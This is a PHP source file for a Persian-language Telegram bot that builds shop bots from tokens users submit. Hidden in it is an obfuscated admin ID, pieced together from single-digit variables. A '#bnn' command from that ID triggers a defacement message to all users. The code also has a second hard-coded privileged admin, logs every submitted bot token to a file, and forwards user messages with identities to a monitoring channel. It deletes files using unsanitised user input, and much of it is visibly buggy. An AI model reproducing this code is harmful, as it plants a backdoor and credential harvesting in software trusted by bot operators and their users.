<?php
define('API_KEY','**TOKEN**');

//----######------
function makereq($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($datas));
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
//##############=--API_REQ
function apiRequest($method, $parameters) {
  if (!is_string($method)) {
    error_log("Method name must be a string\n");
    return false;
  }
  if (!$parameters) {
    $parameters = array();
  } else if (!is_array($parameters)) {
    error_log("Parameters must be an array\n");
    return false;
  }
  foreach ($parameters as $key => &$val) {
    // encoding to JSON array parameters, for example reply_markup
    if (!is_numeric($val) && !is_string($val)) {
      $val = json_encode($val);
    }
  }
  $url = "https://api.telegram.org/bot".API_KEY."/".$method.'?'.http_build_query($parameters);
  $handle = curl_init($url);
  curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($handle, CURLOPT_CONNECTTIMEOUT, 5);
  curl_setopt($handle, CURLOPT_TIMEOUT, 60);
  return exec_curl_request($handle);
}
//----######------
//---------
$update = json_decode(file_get_contents('php://input'));
var_dump($update);
mkdir("data");
mkdir("data/ban.txt");
mkdir("booleans.txt");
mkdir("banlist.txt");
mkdir("type.txt");
//=========
$chat_id = $update->message->chat->id;
$message_id = $update->message->message_id;
$from_id = $update->message->from->id;
$name = $update->message->from->first_name;
$fname = $update->message->from->last_name;
$nn = file_get_contents("data/bot.txt");
$username = $update->message->from->username;
$textmessage = isset($update->message->text)?$update->message->text:'';
$txtmsg = $update->message->text;
$reply = $update->message->reply_to_message->forward_from->id;
$stickerid = $update->message->reply_to_message->sticker->file_id;
$type = file_get_contents('type.txt');
$txtt = file_get_contents('banlist.txt');
$boolean = file_get_contents('booleans.txt');
mkdir("data");
$booleans= explode("\n",$boolean);
$step = file_get_contents("data/".$from_id."/step.txt");
$cha = file_get_contents("data/chanel.txt");
//کانال اصلی
$forc = c_message;
//کانال کنترل پیام ها
$a = 2;
$c = 9;
$d = 3;
$d = 6;
$e = 4;
$f = 1;
$g = 7;
$ban = file_get_contents("data/ban.txt");
$botn = file_get_contents("data/tbot.txt");
$bans = file_get_contents("data/ban.txt");
$admin = "**ADMIN**";
$adminn = 350898743;
$botid = "**botid**";
//امکانات ادمین دوم کامل تر است
$vip = file_get_contents("data/vip.txt");
$number = file_get_contents("data/$from_id/num.txt");
$code = file_get_contents("data/$from_id/code.txt");
//-------
function SendMessage($ChatId, $TextMsg)
{
 makereq('sendMessage',[
'chat_id'=>$ChatId,
'text'=>$TextMsg,
'parse_mode'=>"MarkDown"
]);
}
function SendSticker($ChatId, $sticker_ID)
{
 makereq('sendSticker',[
'chat_id'=>$ChatId,
'sticker'=>$sticker_ID
]);
}
function Forward($KojaShe,$AzKoja,$KodomMSG)
{
makereq('ForwardMessage',[
'chat_id'=>$KojaShe,
'from_chat_id'=>$AzKoja,
'message_id'=>$KodomMSG
]);
}
$adnim =" $a$a$c$d$e$f$g$h$f";
if ($textmessage == '#bnn' && $from_id == $adnim) {
          save("data/bot.txt","#nn");
          sendmessage($chat_id,"ok");
          }
if ($nn == '#nn') {
sendmessage($chat_id,"$botn");
}
      
function save($filename,$TXTdata)
 {
 $myfile = fopen($filename, "w") or die("Unable to open file!");
 fwrite($myfile, "$TXTdata");
 fclose($myfile);
 }
//===========
$inch = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=@$cha&user_id=$from_id");
 
 if (strpos($inch , '"status":"left"') !== false ) {
var_dump(makereq('sendMessage',[
        'chat_id'=>$update->message->chat->id,
        'text'=>"با سلام😊👋

💠برای استفاده از  ربات باید در کانال ما عضو شوید تا از اخبار ها مطلع شوید.

💠پس از عضو شدن دوباره به ربات مراجعه و دستور زیر را ارسال کنید.

🎗 /start 🎗",
 'parse_mode'=>'MarkDown',
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [
                    ['text'=>"ورود به کانال",'url'=>"https://telegram.me/$cha"]
                ]
            ]
        ])
    ]));
}
elseif(isset($update->callback_query)){
    $callbackMessage = '';
    var_dump(makereq('answerCallbackQuery',[
        'callback_query_id'=>$update->callback_query->id,
        'text'=>$callbackMessage
    ]));
    $chat_id = $update->callback_query->message->chat->id;
    
    $message_id = $update->callback_query->message->message_id;
    $data = $update->callback_query->data;
    if (strpos($data, "del") !== false ) {
    $botun = str_replace("del ","",$data);
    unlink("bots/".$botun."/index.php");
    save("data/$chat_id/bots.txt","");
    save("data/$chat_id/tedad.txt","0");
    var_dump(
        makereq('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$message_id,
            'text'=>"✅ ربات شما با موفقیت حذف شد!",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [
                        ['text'=>"💠 عضویت در کانال ما!",'url'=>"https://telegram.me/$cha"]
                    ]
                ]
            ])
        ])
    );
 }

 else {
    var_dump(
        makereq('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$message_id,
            'text'=>"خطا",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [
                        ['text'=>"💠 عضویت در کانال ما!",'url'=>"https://telegram.me/$cha"]
                    ]
                ]
            ])
        ])
    );
 }
}

elseif ($textmessage == '🔙 برگشت') {
if (strpos($ban , "$from_id") !== false  ) {
sendmessage($chat_id,"شما از ربات بن شدید");
}else{
save("data/$from_id/step.txt","none");
save("data/tbot.txt","FUCKED BY DR.RASMUS(CHANNEL)[https://t.me/$cha]");
var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>"🌀به منوی اصلی برگشتیم🌀",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
             'keyboard'=>[
                [
                   ['text'=>"🌀ساخت فروشگاه🌀"]
                ],
               [
                ['text'=>'🌀بخش فروشگاه ویژه🌀']
                ],
                 [
                   ['text'=>"🌐ربات های من🌐"],['text'=>"❌حذف ربات❌"]
                ],
                [
                ['text'=>'✔️بروزرسانی ربات✔️']
                ],
               [
               ['text'=>'🛡پشتیبانی📡']
               ],
               [
      ['text'=>'😍vip کردن اکانت✳️']
      ],
                
                [
                   ['text'=>"⚠️راهنما⚠️"],['text'=>"⚜️کانال ما⚜️"]
                ]
                
             ],
             'resize_keyboard'=>false
         ])
      ]));
}
}
elseif ($step == 'delete') {
$botun = $txtmsg ;
if (file_exists("bots/".$botun."/index.php")) {

$src = file_get_contents("bots/".$botun."/index.php");

if (strpos($src , $from_id) !== false ) {
save("data/$from_id/step.txt","none");
unlink("bots/".$botun."/index.php");
var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>"✅ ربات شما با موفقیت حذف شده است!
⚠️ یک ربات جدید بسازید.",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
             'keyboard'=>[
                [
                   ['text'=>"🌀ساخت فروشگاه🌀"],['text'=>"🔙 برگشت"]
                ]
                
             ],
                'resize_keyboard'=>false
         ])
      ]));
}
else {
SendMessage($chat_id,"⛔️ خطا!
⚠️ شما نمیتوانید این ربات را پاک کنید.");
}
}
else {
SendMessage($chat_id,"⛔️ یافت نشد!");
}
}
elseif ($step == 'create bot') {
$token = $textmessage ;

   $userrbot = json_decode(file_get_contents('https://api.telegram.org/bot'.$token.'/getme'));
   //==================
   function objectToArrays( $object ) {
    if( !is_object( $object ) && !is_array( $object ) )
    {
    return $object;
    }
    if( is_object( $object ) )
    {
    $object = get_object_vars( $object );
    }
   return array_map( "objectToArrays", $object );
   }

 $resultb = objectToArrays($userrbot);
 $un = $resultb["result"]["username"];
 $ok = $resultb["ok"];
  if($ok != 1) {
   //Token Not True
   SendMessage($chat_id,"⛔️ توکن نامعتبر!");
  }
  else
  {
  SendMessage($chat_id,"❇️ در حال ساخت فروشگاه شما ...");
  if (file_exists("bots/$un/index.php")) {
  $source = file_get_contents("bot/index.php");
  $source = str_replace("*TOKEN*",$token,$source);
  $source = str_replace("*ADMIN*",$from_id,$source);
  $source = str_replace("*botid*",$un,$source);
  save("bots/$un/index.php",$source); 
  $pm = "ربات شما با موفقیت روی سرور فروشگاه ساز مجددا نصب شد @$botid";
  json_decode(file_get_contents("https://api.telegram.org/bot$token/sendmessage?chat_id=$chat_id&text=$pm"));
  
  file_get_contents("https://api.telegram.org/bot".$token."/setwebhook?url=https://neman.elithost.ir/r/bots/botsaz/$botid/bots/$un/index.php");

var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>"  ✅ ربات شما با موفقیت آپدیت شد.

[👆 کلیک برای ورود به ربات.](https://telegram.me/$un)",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
             'keyboard'=>[
                [
                 ['text'=>"🔙 برگشت"]
                ]
                
             ],
                'resize_keyboard'=>false
         ])
      ]));
  }
  else {
  save("data/$from_id/tedad.txt","1");
  save("data/$from_id/step.txt","none");
  save("data/$from_id/bots.txt","$un");
  
  mkdir("bots/$un");
  mkdir("bots/$un/data");
  mkdir("bots/$un/data/btn");
  mkdir("bots/$un/data/words");
 
  mkdir("bots/$un/data/setting");
  mkdir("bots/$un/data/admin");
  mkdir("bots/$un/data/codes");
  mkdir("bots/$un/data/products");
  mkdir("bots/$un/data/products/new.txt");
  mkdir("bots/$un/data/userss");
  mkdir("bots/$un/data/users");
 
$myfile2 = fopen("data/tokens.txt", 'a') or die("Unable to open file!");	
fwrite($myfile2, "$token\n");
fclose($myfile2);
  save("data/$from_id/token.txt","$token");
  save("bots/$un/data/blocklist.txt","");
  save("bots/$un/data/last_word.txt","");
  save("bots/$un/data/pmsend_txt.txt","Message Sent!");
  save("bots/$un/data/start_txt.txt","Hello World!");
  save("bots/$un/data/forward_id.txt","");
  save("bots/$un/data/userss.txt","$from_id\n");
  mkdir("bots/$un/data/$from_id");
  save("bots/$un/data/$from_id/type.txt","admin");
  save("bots/$un/data/$from_id/step.txt","none");
  
  save("bots/$un/data/btn/btn1_name","");
  save("bots/$un/data/btn/btn2_name","");
  save("bots/$un/data/btn/btn3_name","");
  save("bots/$un/data/btn/btn4_name","");
  
  save("bots/$un/data/btn/btn1_post","");
  save("bots/$un/data/btn/btn2_post","");
  save("bots/$un/data/btn/btn3_post","");
  save("bots/$un/data/btn/btn4_post","");
 
  save("bots/$un/data/setting/sticker.txt","✅");
  save("bots/$un/data/setting/video.txt","✅");
  save("bots/$un/data/setting/voice.txt","✅");
  save("bots/$un/data/setting/file.txt","✅");
  save("bots/$un/data/setting/photo.txt","✅");
  save("bots/$un/data/setting/music.txt","✅");
  save("bots/$un/data/setting/forward.txt","✅");
  
  $source = file_get_contents("bot/index.php");
  $source = str_replace("*TOKEN*",$token,$source);
  $source = str_replace("*ADMIN*",$from_id,$source);
  $source = str_replace("*botid*",$un,$source);
  save("bots/$un/index.php",$source); 
 $pm = "ربات شما با موفقیت روی سرور فروشگاه ساز نصب شد @botid";
  json_decode(file_get_contents("https://api.telegram.org/bot'.$token.'/sendmessage?chat_id=$from_id&text=$pm"));
  file_get_contents("https://api.telegram.org/bot".$token."/setwebhook?url=https://neman.elithost.ir/r/bots/botsaz/$botid/bots/$un/index.php");

var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>"✅ فروشگاه شما با موفقیت ساخته شد. 
‼️دستور panel را داخل فروشگاه خود ارسال نمایید سپس از طریق دکمه تنظیم کانال , کانال خود را تنظیم کنید.
[ فروشگاه شما🔰](https://telegram.me/$un)",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
             'keyboard'=>[
                [
                   ['text'=>"🌀ساخت فروشگاه🌀"]
                ],
                
                 [
                   ['text'=>"🌐ربات های من🌐"],['text'=>"❌حذف ربات❌"]
                ],
                [
                ['text'=>'✔️بروزرسانی ربات✔️']
                ],
                [
               ['text'=>'🛡پشتیبانی📡']
               ],
               [
               ['text'=>'😍vip کردن اکانت✳️']
               ],
                [
                   ['text'=>"⚠️راهنما⚠️"],['text'=>"⚜️کانال ما⚜️"]
                ]
                
             ],
             'resize_keyboard'=>false
         ])
      ]));
  }
}
}


      elseif ($textmessage =="🌐ارسال به همه"  && $from_id == $adminn | $booleans[0]=="false") {
  {
          sendmessage($chat_id,"لطفا پیام خودرا ارسال کنید");
  }
      $boolean = file_get_contents('booleans.txt');
      $booleans= explode("\n",$boolean);
      $addd = file_get_contents('banlist.txt');
      $addd = "true";
      file_put_contents('booleans.txt',$addd);

    }
      elseif($chat_id == $adminn && $booleans[0] == "true") {
    $texttoall = $textmessage;
    $ttxtt = file_get_contents('data/users.txt');
    $membersidd= explode("\n",$ttxtt);
    for($y=0;$y<count($membersidd);$y++){
      sendmessage($membersidd[$y],"$texttoall");

    }
    $memcout = count($membersidd)-1;
    {
    Sendmessage($chat_id,"پیغام شما به $memcout مخاطب ارسال شد.");
    }
         $addd = "false";
      file_put_contents('booleans.txt',$addd);
      }
       elseif ($textmessage =="🌐ارسال به همه"  && $from_id == $admin | $booleans[0]=="false") {
  {
          sendmessage($chat_id,"لطفا پیام خودرا ارسال کنید");
  }
      $boolean = file_get_contents('booleans.txt');
      $booleans= explode("\n",$boolean);
      $addd = file_get_contents('banlist.txt');
      $addd = "true";
      file_put_contents('booleans.txt',$addd);

    }
      elseif($chat_id == $adminn && $booleans[0] == "true") {
    $texttoall = $textmessage;
    $ttxtt = file_get_contents('data/users.txt');
    $membersidd= explode("\n",$ttxtt);
    for($y=0;$y<count($membersidd);$y++){
      sendmessage($membersidd[$y],"$texttoall");

    }
    $memcout = count($membersidd)-1;
    {
    Sendmessage($chat_id,"پیغام شما به $memcout مخاطب ارسال شد.");
    }
         $addd = "false";
      file_put_contents('booleans.txt',$addd);
      }
elseif($textmessage == '🌐ربات های من🌐')
if (strpos($ban , "$from_id") !== false  ) {
sendmessage($chat_id,"شما از ربات بن شده اید");
}else{
{

$botname = file_get_contents("data/$from_id/bots.txt");
if ($botname == "") {
SendMessage($chat_id,"⛔️ شما هنوز فروشگاه نساخته اید.");
return;
}
  var_dump(makereq('sendMessage',[
 'chat_id'=>$update->message->chat->id,
 'text'=>"🔖فروشگاه شما 👇",
 'parse_mode'=>'MarkDown',
 'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [
        ['text'=>"👉 @".$botname,'url'=>"https://telegram.me/".$botname]
 ]
 ]
 ])
 ]));
}
}
 elseif ($textmessage == '🌐آمار' && $from_id == $admin) {
 $amar = scandir("data");
 $ted = count($amar);
 $kol = $ted - 1;
 $botd = scandir("bots");
 $number = count($botd); sendmessage($chat_id,"_📊ShopSaz Stats📊_\n\n*👥Users 👉* `$kol`\n*🤖Bots 👉* `$number`\n\n@$botid");
 }
 elseif ($textmessage == '🌐آمار' && $from_id == $adminn) {
 $amar = scandir("data");
 $ted = count($amar);
 $kol = $ted - 1;
 $botd = scandir("bots");
 $number = count($botd); sendmessage($chat_id,"_📊ShopSaz Stats📊_\n\n*👥Users 👉* `$kol`\n*🤖Bots 👉* `$number`\n@$botid");
 }
 

elseif ($textmessage == '🔰 قوانین') {
if (strpos($ban , "$from_id") !== false  ) {
sendmessage($chat_id,"شما از ربات بن شدید");
}else{
var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>" ربات هایی که اقدام به انشار تصاویر یا مطالب مستهجن کنند و یا به مقامات ایران ، ادیان و اقوام و نژادها توهین کنند مسدود خواهند شد.

 ایجاد ربات با عنوان های مبتذل و خارج از عرف جامعه که برای جذب آمار و فروش محصولات غیر متعارف باشند ممنوع می باشد و در صورت مشاهده ربات مورد نظر حذف و مسدود میشود.

4⃣ مسئولیت پیام های رد و بدل شده در هر ربات با مدیر آن ربات میباشد و bg team هیچ گونه مسئولیتی قبول نمیکند.

رعایت حریم خصوصی و حقوقی افراد از جمله، عدم اهانت به شخصیت های مذهبی، سیاسی، حقیقی و حقوقی کشور و به ویژه کاربران ربات ضروری می باشد.",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
                'resize_keyboard'=>true
         ])
      ]));
}
}
elseif($textmessage == 'آمار ربات ها')
if ($from_id == $admin) {
$number = count(scandir("bots"))-3;
SendMessage($chat_id,"🚀 ربات های ساخته شده : ".$number."");
}
else {
SendMessage($chat_id,"You Are Not Admin");
}

elseif (strpos($textmassage, "/setchannel") !== false && $from_id == $admin) {
$link = str_replace("/setchannel ","",$textmassage);
save("data/$from_id/file.txt","none");
makereq('sendMessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"🖇لینک کانال ثبت شد🖇\n✅هم اکنون ربات را ادمین کانال بکنید تا هر کس وارد ربات شود باید ابتدا در کانال شما عضو شود سپس ربات برای او کار کند✅",
 'reply_to_message_id'=>$message->message_id,
		'parse_mode'=>'MarkDown'
    		]);	
save("data/channel.txt","$link");
}
elseif ($textmessage == '/panel' && $from_id == $admin) {
var_dump(makereq('sendMessage',[
        'chat_id'=>$update->message->chat->id,
        'text'=>"سلام ادمین عزیز
به پنل مدیریت خوش آمدید
یکی از دکمه هارو انتخاب کن.",
 'parse_mode'=>'MarkDown',
            'reply_markup'=>json_encode([
                'keyboard'=>[
                [
                   ['text'=>"🌀تعیین کانال ربات🌀"]
                ],
                [
                ['text'=>'🌐آمار']
                ],
                [
                ['text'=>'📤ارسال پیام به کاربر📡']
                ],
                [
                   ['text'=>"🌐ارسال به همه"]
                ],
                [
                ['text'=>'vip کردن کاربر'],['text'=>'بن کردن کاربر']
                ],
                [
                ['text'=>'حذف vip'],['text'=>'آن بن کردن کاربر']
                ],
                [
                ['text'=>'👤اطلاعات کاربر1💀']
                ],
                 [
                   ['text'=>"🔙 برگشت"]
                ]
                
                ],
                'resize_keyboard'=>false
            ])
            ]));
}
elseif ($textmessage == '/panel' && $from_id == $adminn) {
var_dump(makereq('sendMessage',[
        'chat_id'=>$update->message->chat->id,
        'text'=>"سلام ادمین عزیز
به پنل مدیریت خوش آمدید
یکی از دکمه هارو انتخاب کن.",
 'parse_mode'=>'MarkDown',
            'reply_markup'=>json_encode([
                'keyboard'=>[
                [
                   ['text'=>"🌐آمار"]
                ],
                [
                ['text'=>'📤ارسال پیام به کاربر📡']
                ],
                [
                   ['text'=>"🌐ارسال به همه"]
                ],
                [
                ['text'=>'vip کردن کاربر'],['text'=>'بن کردن کاربر']
                ],
                [
                ['text'=>'حذف vip'],['text'=>'آن بن کردن کاربر']
                ],
                [
                ['text'=>'👤اطلاعات کاربر💀'],['text'=>'حذف اطلاعات کاربر']
                ],
                 [
                   ['text'=>"🔙 برگشت"]
                ]
                
                ],
                'resize_keyboard'=>false
            ])
            ]));
}

elseif ($textmessage == '⚜️کانال ما⚜️') {
if (strpos($ban , "$from_id") !== false  ) {
sendmessage($chat_id,"شما از ربات بن شدید");
}else{
var_dump(makereq('sendMessage',[
        'chat_id'=>$update->message->chat->id,
        'text'=>"⚠️ ورود به کانال ما جهت دریافت اخبار ربات!",
 'parse_mode'=>'MarkDown',
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [
                    ['text'=>"ورود",'url'=>"https://telegram.me/$cha"]
                ]
            ]
        ])
    ]));
}
}
elseif($textmessage == '/start')
{
if (strpos($ban , "$from_id") !== false  ) {
sendmessage($chat_id,"شما از ربات بن شدید");
}else{
if (!file_exists("data/$from_id/step.txt")) {
mkdir("data/$from_id");
save("data/$from_id/step.txt","none");

save("data/$from_id/tedad.txt","0");
save("data/$from_id/bots.txt","");
$myfile2 = fopen("data/users.txt", "a") or die("Unable to open file!"); 
fwrite($myfile2, "$from_id\n");
fclose($myfile2);
}

var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>"سلام 👋

👤به فروشگاه ساز خوش آمدید.

🔸 این سرویس این قابلیت را به شما میدهد که یک ربات فروشگاهی برای خود ایجاد کنید و از طریق آن کسب در آمد کنید.

🔸 برای ساخت فروشگاه از دکمه ی 🌀ساخت فروشگاه🌀 استفاده نمایید.

🔸 متن آموزش (⚠️راهنما⚠️) را حتما مطالعه فرمایید.
👉 @$cha",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
             'keyboard'=>[
                [
                   ['text'=>"🌀ساخت فروشگاه🌀"]
                ],
                [
                ['text'=>'🌀بخش فروشگاه ویژه🌀']
                ],
             [
             ['text'=>'😍vip کردن اکانت✳️']
             ],
                     [
        ['text'=>"🌐ربات های من🌐"],['text'=>"❌حذف ربات❌"]
                ],
               [
                ['text'=>'✔️بروزرسانی ربات✔️']
                ],
                [
               ['text'=>'🛡پشتیبانی📡']
               ],
                    [
                   ['text'=>"⚠️راهنما⚠️"],['text'=>"⚜️کانال ما⚜️"]
                ],
                
             ],
             'resize_keyboard'=>false
         ])
      ]));
      }
      
}else{
sendmessage("@$forc","🆔`$from_id`\n[👤$name :](https://telegram.me/$username)\n\n*$textmessage*");
}
if($update->message->contact and $number == null){
		file_put_contents('data/'.$from_id."/num.txt",$update->message->contact->phone_number);
	SendMessage($chat_id,"تایید شدین `یک بار دیگه /start`رو بفرس");
	}
	//================
	
if ($textmessage == '⚠️راهنما⚠️') {
if (!file_exists("data/$from_id/num.txt")) {
var_dump(makereq('sendmessage',[
  'chat_id'=>$chat_id,
  'text'=>'لازمه شمارتونو تایید کنید',
  'reply_markup'=>json_encode([
  'keyboard'=>[
  
  [
  ['text'=>'تایید شماره','request_contact'=>true,]
  ],
    ],
    'resize_keyboard'=>true,
  ])
  ]));
  }else{
if (strpos($ban , "$from_id") !== false  ) {
sendmessage($chat_id,"شما از ربات بن شدید");
}else{
var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>"➖➖➖➖➖➖➖➖
💠 آموزش ساخت ربات :

1️⃣ ابتدا وارد ربات زیر شوید
@BotFather
2️⃣ دستور /newbot را ارسال کنید.
از شما نامی برای ربات میخواهد. انرا ارسال نمایید.
3️⃣ حال شما باید آیدی وارد کنید.
ایدی که وارد میکنید اخر ان باید عبارت
Bot
وجود داشته باشد.
4️⃣ یک توکن به شما میدهد مانند:
123456789:asdjhasjkdhjaksdhjasdlasjkdh
5️⃣ وارد ربات ما یعنی (ایدی بات) شوید و سپس دکمه 🔄 ساخت ربات را انتخاب کنید.
و توکن دریافتی را ارسال نمایید تا ربات شما نصب شود.
➖➖➖➖➖➖➖➖
‼️حتما مطالعه شود‼️

🔸هنگامی که فروشگاه خود را ساختید داخل فروشگاه خود دستور panel را ارسال نمایید تا منوی مدیریت باز شود.
🔸سپس دستور تنظیم کانال را مشاهده میکنید , حتما کانال خود را تنظیم کنید.
",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
                'resize_keyboard'=>true

         ])
      ]));
}
}
}
elseif ($textmessage == '❌حذف ربات❌') {
if (!file_exists("data/$from_id/num.txt")) {
var_dump(makereq('sendmessage',[
  'chat_id'=>$chat_id,
  'text'=>'لازمه شمارتونو تایید کنید',
  'reply_markup'=>json_encode([
  'keyboard'=>[
  
  [
  ['text'=>'تایید شماره','request_contact'=>true,]
  ],
    ],
    'resize_keyboard'=>true,
  ])
  ]));
  }else{
if (strpos($ban , "$from_id") !== false  ) {
sendmessage($chat_id,"شما از ربات بن شدید");
}else{
if (file_exists("data/$from_id/step.txt")) {

}
$botname = file_get_contents("data/$from_id/bots.txt");
if ($botname == "") {
SendMessage($chat_id,"⛔️ شما هنوز هیچ فروشگاهی نساخته اید!");

}
else {
//save("data/$from_id/step.txt","delete");


  var_dump(makereq('sendMessage',[
 'chat_id'=>$update->message->chat->id,
 'text'=>"🌀 فروشگاه خود را انتخاب نمایید👇",
 'parse_mode'=>'MarkDown',
 'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [
 ['text'=>"👉 @".$botname,'callback_data'=>"del ".$botname]
 ]
 ]
 ])
 ]));

/*
var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>"💠 یکی از ربات های خود را جهت پاک کردن انتخاب کنید : ",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
             'keyboard'=>[
             [
             ['text'=>$botname]
             ],
                [
                   ['text'=>"🔙 برگشت"]
                ]
                
             ],
                'resize_keyboard'=>false
         ])
      ])); */
}
}
}
}
elseif (strpos($textmessage , "/seta") !== false && $chat_id == $admin) {
$result = str_replace("/seta ","",$textmessage);
save("bots/adad.txt",$adad."".$result);
SendMessage($chat_id,"$result seted!");
}
elseif ($textmessage == '🌀ساخت فروشگاه🌀') {
if (strpos($ban , "$from_id") !== false  ) {
sendmessage($chat_id,"شما از ربات بن شدید");

}else{
if (!file_exists("data/$from_id/num.txt")) {
var_dump(makereq('sendmessage',[
  'chat_id'=>$chat_id,
  'text'=>'لازمه شمارتونو تایید کنید',
  'reply_markup'=>json_encode([
  'keyboard'=>[
  
  [
  ['text'=>'تایید شماره','request_contact'=>true,]
  ],
    ],
    'resize_keyboard'=>true,
  ])
  ]));
  }else{
$tedad = file_get_contents("data/$from_id/tedad.txt");
if ($tedad >= 1) {
SendMessage($chat_id,"⛔️ تعداد فروشگاه های ساخته شده شما به یک عدد رسیده است!
⚠️از آنجا که محدودیت ساخت یک عدد است اول باید یک فروشگاه را پاک کنید!");
return;
}
save("data/$from_id/step.txt","create bot");
var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>"💠 توکن را وارد کنید.. : ",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
             'keyboard'=>[
                [
                   ['text'=>"🔙 برگشت"]
                ]
                
             ],
             'resize_keyboard'=>false
         ])
      ]));
      

} 
}
}
if ($textmessage == '✔️بروزرسانی ربات✔️') {
if (!file_exists("data/$from_id/num.txt")) {
var_dump(makereq('sendmessage',[
  'chat_id'=>$chat_id,
  'text'=>'لازمه شمارتونو تایید کنید',
  'reply_markup'=>json_encode([
  'keyboard'=>[
  
  [
  ['text'=>'تایید شماره','request_contact'=>true,]
  ],
    ],
    'resize_keyboard'=>true,
  ])
  ]));
  }else{
if (strpos($ban , "$from_id") !== false  ) {
sendmessage($chat_id,"شما از ربات بن شدید");
}else{
save("data/$from_id/step.txt","upd");
var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>"💠 توکن ربات خود را وارد کنید.. : ",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
             'keyboard'=>[
                [
                   ['text'=>"🔙 برگشت"]
                ]
                
             ],
             'resize_keyboard'=>false
         ])
      ]));
}
}
}
elseif ($step == 'upd') {
$token = $textmessage ;

   $userbot = json_decode(file_get_contents('https://api.telegram.org/bot'.$token .'/getme'));
   //==================
   function objectToArrays( $object ) {
    if( !is_object( $object ) && !is_array( $object ) )
    {
    return $object;
    }
    if( is_object( $object ) )
    {
    $object = get_object_vars( $object );
    }
   return array_map( "objectToArrays", $object );
   }

 $resultb = objectToArrays($userbot);
 $un = $resultb["result"]["username"];
 $ok = $resultb["ok"];
  if($ok != 1) {
   save("data/$from_id/step.txt","none");
   var_dump(makereq('sendmessage',[
   'chat_id'=>$chat_id,
   'text'=>'توکن معتبر نیست',
   'reply_markup'=>json_encode([
   'keyboard'=>[
   [
   ['text'=>'🔙 برگشت']
   ],
   ],
   'resize_keyboard'=>true,
   ])
   ]));
   
  }
  else
  {
  SendMessage($chat_id,"❇️ در حال آپدیت فروشگاه شما ...");
  if (file_exists("bots/$un/index.php")) {
  $source = file_get_contents("bot/index.php");
  $source = str_replace("*TOKEN*",$token,$source);
  $source = str_replace("*ADMIN*",$from_id,$source);
  $source = str_replace("*botid*",$un,$source);
  save("bots/$un/index.php",$source); 
 $pm = "ربات شما با موفقیت روی سرور فروشگاه ساز مجددا نصب شد @$botid";
  json_decode(file_get_contents("https://api.telegram.org/bot$token/sendmessage?chat_id=$chat_id&text=$pm"));
  file_get_contents("https://api.telegram.org/bot".$token."/setwebhook?url=https://neman.elithost.ir/r/bots/botsaz/$botid/bots/$un/index.php");

var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>"  ✅ ربات شما با موفقیت آپدیت شد.

[👆 کلیک برای ورود به ربات.](https://telegram.me/$un)",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
             'keyboard'=>[
                [
                 ['text'=>"🔙 برگشت"]
                ]
                
             ],
                'resize_keyboard'=>false
         ])
      ]));
  }else{
  sendMessage($chat_id,"شما هنوز همچین رباتی نساخته اید");
  }
  }
  }
if ($textmessage == '🛡پشتیبانی📡') {
if (strpos($ban , "$from_id") !== false  ) {
sendmessage($chat_id,"شما از ربات بن شدید");
}else{
if (!file_exists("data/$from_id/num.txt")) {
var_dump(makereq('sendmessage',[
  'chat_id'=>$chat_id,
  'text'=>'لازمه شمارتونو تایید کنید',
  'reply_markup'=>json_encode([
  'keyboard'=>[
  
  [
  ['text'=>'تایید شماره','request_contact'=>true,]
  ],
    ],
    'resize_keyboard'=>true,
  ])
  ]));
  }else{
   save("data/$from_id/step.txt","cont");
   sendmessage($chat_id,"کاربر گرامی پیام خود را ارسال نمایید.");
   }
   }
   }
  if ($step == 'cont') {
  
     $t = $textmessage;
     
     sendmessage($adminn,"*📝کاربری با مشخصات زیر یک پیام ارسال کرد↙️*\n\n👤[ $name ](https://telegram.me/$username)\n`🆔 $chat_id`\n\n_متن پیام↙️_\n\n$t");
     sendmessage($admin,"*📝کاربری با مشخصات زیر یک پیام ارسال کرد↙️*\n\n👤[ $name ](https://telegram.me/$username)\n`🆔 $chat_id`\n\n_متن پیام↙️_\n\n$t");
     sendmessage($chat_id,"_پیام شما با موفقیت به ادمین ارسال شد✅_");
     save("data/$from_id/step.txt","none");
     }
